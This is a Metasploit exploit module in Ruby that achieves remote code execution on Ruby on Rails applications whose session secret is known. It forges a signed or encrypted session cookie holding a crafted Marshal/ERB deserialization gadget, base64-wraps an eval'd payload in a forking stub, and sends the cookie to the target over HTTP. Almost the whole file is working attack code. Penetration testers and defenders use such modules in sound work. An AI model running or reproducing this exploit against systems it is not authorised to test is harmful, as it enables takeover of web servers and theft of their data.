##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
 
require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  #Helper Classes copy/paste from Rails4
  class MessageVerifier
 
    class InvalidSignature < StandardError; end
 
    def initialize(secret, options = {})
      @secret = secret
      @digest = options[:digest] || 'SHA1'
      @serializer = options[:serializer] || Marshal
    end
 
    def generate(value)
      data = ::Base64.strict_encode64(@serializer.dump(value))
      "#{data}--#{generate_digest(data)}"
    end
 
    def generate_digest(data)
      require 'openssl' unless defined?(OpenSSL)
      OpenSSL::HMAC.hexdigest(OpenSSL::Digest.const_get(@digest).new, @secret, data)
    end
 
  end
 
  class MessageEncryptor
 
    module NullSerializer #:nodoc:
 
      def self.load(value)
        value
      end
 
      def self.dump(value)
        value
      end
 
    end
 
    class InvalidMessage < StandardError; end
 
    OpenSSLCipherError = OpenSSL::Cipher::CipherError
 
    def initialize(secret, *signature_key_or_options)
      options = signature_key_or_options.extract_options!
      sign_secret = signature_key_or_options.first
      @secret = secret
      @sign_secret = sign_secret
      @cipher = options[:cipher] || 'aes-256-cbc'
      @verifier = MessageVerifier.new(@sign_secret || @secret, :serializer => NullSerializer)
      # @serializer = options[:serializer] || Marshal
    end
 
    def encrypt_and_sign(value)
      @verifier.generate(_encrypt(value))
    end
 
    def _encrypt(value)
      cipher = new_cipher
      cipher.encrypt
      cipher.key = @secret
      # Rely on OpenSSL for the initialization vector
      iv = cipher.random_iv
      #encrypted_data = cipher.update(@serializer.dump(value))
      encrypted_data = cipher.update(value)
      encrypted_data << cipher.final
      [encrypted_data, iv].map {|v| ::Base64.strict_encode64(v)}.join("--")
    end
 
    def new_cipher
      OpenSSL::Cipher::Cipher.new(@cipher)
    end
 
  end
 
  class KeyGenerator
 
    def initialize(secret, options = {})
      @secret = secret
      @iterations = options[:iterations] || 2**16
    end
 
    def generate_key(salt, key_size=64)
      OpenSSL::PKCS5.pbkdf2_hmac_sha1(@secret, salt, @iterations, key_size)
    end
 
  end
 
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Ruby on Rails Known Secret Session Cookie Remote Code Execution',
      'Description'    => %q{
          This module implements Remote Command Execution on Ruby on Rails applications.
          Prerequisite is knowledge of the "secret_token" (Rails 2/3) or "secret_key_base"
          (Rails 4). The values for those can be usually found in the file
          "RAILS_ROOT/config/initializers/secret_token.rb". The module achieves RCE by
          deserialization of a crafted Ruby Object.
      },
      'Author'         =>
        [
          'joernchen of Phenoelit <joernchen[at]phenoelit.de>',
        ],
      'License'        => MSF_LICENSE,
      'References'  =>
        [
          ['URL', 'https://charlie.bz/blog/rails-3.2.10-remote-code-execution'], #Initial exploit vector was taken from here
          ['URL', 'http://robertheaton.com/2013/07/22/how-to-hack-a-rails-app-using-its-secret-token/']
        ],
      'DisclosureDate' => 'Apr 11 2013',
      'Platform'       => 'ruby',
      'Arch'           => ARCH_RUBY,
      'Privileged'     => false,
      'Targets'        =>  [ ['Automatic', {} ] ],
      'DefaultTarget' => 0))
 
    register_options(
      [
        Opt::RPORT(80),
        OptInt.new('RAILSVERSION', [ true, 'The target Rails Version (use 3 for Rails3 and 2, 4 for Rails4)', 3]),
        OptString.new('TARGETURI', [ true, 'The path to a vulnerable Ruby on Rails application', "/"]),
        OptString.new('HTTP_METHOD', [ true, 'The HTTP request method (GET, POST, PUT typically work)', "GET"]),
        OptString.new('SECRET', [ true, 'The secret_token (Rails3) or secret_key_base (Rails4) of the application (needed to sign the cookie)', nil]),
        OptString.new('COOKIE_NAME', [ false, 'The name of the session cookie',nil]),
        OptString.new('DIGEST_NAME', [ true, 'The digest type used to HMAC the session cookie','SHA1']),
        OptString.new('SALTENC', [ true, 'The encrypted cookie salt', 'encrypted cookie']),
        OptString.new('SALTSIG', [ true, 'The signed encrypted cookie salt', 'signed encrypted cookie']),
        OptBool.new('VALIDATE_COOKIE', [ false, 'Only send the payload if the session cookie is validated', true]),
 
      ], self.class)
  end
 
 
  #
  # This stub ensures that the payload runs outside of the Rails process
  # Otherwise, the session can be killed on timeout
  #
  def detached_payload_stub(code)
  %Q^
    code = '#{ Rex::Text.encode_base64(code) }'.unpack("m0").first
    if RUBY_PLATFORM =~ /mswin|mingw|win32/
      inp = IO.popen("ruby", "wb") rescue nil
      if inp
        inp.write(code)
        inp.close
      end
    else
      Kernel.fork do
        eval(code)
      end
    end
    {}
  ^.strip.split(/\n/).map{|line| line.strip}.join("\n")
  end
 
  def check_secret(data, digest)
    data = Rex::Text.uri_decode(data)
    if datastore['RAILSVERSION'] == 3
      sigkey = datastore['SECRET']
    elsif datastore['RAILSVERSION'] == 4
      keygen = KeyGenerator.new(datastore['SECRET'],{:iterations => 1000})
      sigkey = keygen.generate_key(datastore['SALTSIG'])
    end
    digest == OpenSSL::HMAC.hexdigest(OpenSSL::Digest::Digest.new(datastore['DIGEST_NAME']), sigkey, data)
  end
 
  def rails_4
    keygen = KeyGenerator.new(datastore['SECRET'],{:iterations => 1000})
    enckey = keygen.generate_key(datastore['SALTENC'])
    sigkey = keygen.generate_key(datastore['SALTSIG'])
    crypter = MessageEncryptor.new(enckey, sigkey)
    crypter.encrypt_and_sign(build_cookie)
  end
 
  def rails_3
    # Sign it with the secret_token
    data = build_cookie
    digest = OpenSSL::HMAC.hexdigest(OpenSSL::Digest::Digest.new("SHA1"), datastore['SECRET'], data)
    marshal_payload = Rex::Text.uri_encode(data)
    "#{marshal_payload}--#{digest}"
  end
 
  def build_cookie
 
    # Embed the payload with the detached stub
    code =
      "eval('" +
      Rex::Text.encode_base64(detached_payload_stub(payload.encoded)) +
      "'.unpack('m0').first)"
 
    if datastore['RAILSVERSION'] == 4
      return "\x04\b" +
      "o:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\b" +
        ":\x0E@instanceo" +
          ":\bERB\x06" +
            ":\t@src"+  Marshal.dump(code)[2..-1] +
        ":\f@method:\vresult:" +
        "\x10@deprecatoro:\x1FActiveSupport::Deprecation\x00"
    end
    if datastore['RAILSVERSION'] == 3
      return Rex::Text.encode_base64 "\x04\x08" +
      "o"+":\x40ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy"+"\x07" +
        ":\x0E@instance" +
          "o"+":\x08ERB"+"\x06" +
            ":\x09@src" +
              Marshal.dump(code)[2..-1] +
        ":\x0C@method"+":\x0Bresult"
    end
  end
 
  #
  # Send the actual request
  #
  def exploit
    if datastore['RAILSVERSION'] == 3
      cookie = rails_3
    elsif datastore['RAILSVERSION'] == 4
      cookie = rails_4
    end
    cookie_name = datastore['COOKIE_NAME']
 
    print_status("Checking for cookie #{datastore['COOKIE_NAME']}")
    res = send_request_cgi({
      'uri'    => datastore['TARGETURI'] || "/",
      'method' => datastore['HTTP_METHOD'],
    }, 25)
    if res && res.headers['Set-Cookie']
      match = res.headers['Set-Cookie'].match(/([_A-Za-z0-9]+)=([A-Za-z0-9%]*)--([0-9A-Fa-f]+); /)
    end
 
    if match
      if match[1] == datastore['COOKIE_NAME']
        print_status("Found cookie, now checking for proper SECRET")
      else
        print_status("Adjusting cookie name to #{match[1]}")
        cookie_name = match[1]
      end
 
      if check_secret(match[2],match[3])
        print_good("SECRET matches! Sending exploit payload")
      else
        fail_with(Exploit::Failure::BadConfig, "SECRET does not match")
      end
    else
      print_warning("Caution: Cookie not found, maybe you need to adjust TARGETURI")
      if cookie_name.nil? || cookie_name.empty?
        # This prevents trying to send busted cookies with no name
        fail_with(Exploit::Failure::BadConfig, "No cookie found and no name given")
      end
      if datastore['VALIDATE_COOKIE']
        fail_with(Exploit::Failure::BadConfig, "COOKIE not validated, unset VALIDATE_COOKIE to send the payload anyway")
      else
        print_status("Trying to leverage default controller without cookie confirmation.")
      end
    end
 
    print_status "Sending cookie #{cookie_name}"
    res = send_request_cgi({
      'uri'     => datastore['TARGETURI'] || "/",
      'method'  => datastore['HTTP_METHOD'],
      'headers' => {'Cookie' => cookie_name+"="+ cookie},
    }, 25)
 
    handler
  end
 
end
